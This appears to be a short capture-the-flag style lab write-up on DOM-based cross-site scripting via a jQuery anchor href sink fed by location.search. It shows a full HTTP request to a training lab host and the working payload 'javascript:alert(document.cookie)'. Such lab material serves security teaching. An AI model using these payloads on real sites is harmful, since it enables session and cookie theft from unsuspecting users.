## Lab: DOM XSS in jQuery anchor href attribute sink using `location.search` source

Description:

- This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

- To solve this lab, make the "back" link alert `document.cookie`. 


```
GET /feedback?returnPath=javascript:alert(document.cookie) HTTP/2
Host: 0a2f002c0432789a87234d540047007f.web-security-academy.net
Cookie: session=EUUDAYlXFB1ZqHup5Rg9CvKJNKkLcaXf
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Manual Payload:

```
javascript:alert(document.cookie)
```